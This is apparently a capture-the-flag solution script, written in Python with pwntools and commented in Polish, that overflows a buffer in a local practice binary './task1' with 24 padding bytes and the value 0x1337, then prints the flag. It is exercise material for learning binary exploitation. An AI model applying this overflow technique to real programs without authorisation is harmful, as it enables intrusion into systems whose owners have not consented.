#!/usr/bin/python3
from pwn import *

def exploit():

    # Połączenie z programem
    p = process(['./task1'])
    # po otrzymaniu znaku ':' wysłanie do programu payload'u
    p.sendlineafter(b':', b'A' * 24 + p32(0x1337))
    # Odczytywanie kolejnych linijek zwróconcych przez program
    line=p.recvline().decode('utf-8')
    print(line)
    line=p.recvline().decode('utf-8')
    print(line)
    #Ostatnia linia zwrócona przez program to flaga
    line=p.recvline().decode('utf-8')
    print(line)

    # Zamknięcie połączenia
    p.close()

if __name__ == "__main__":
    exploit()
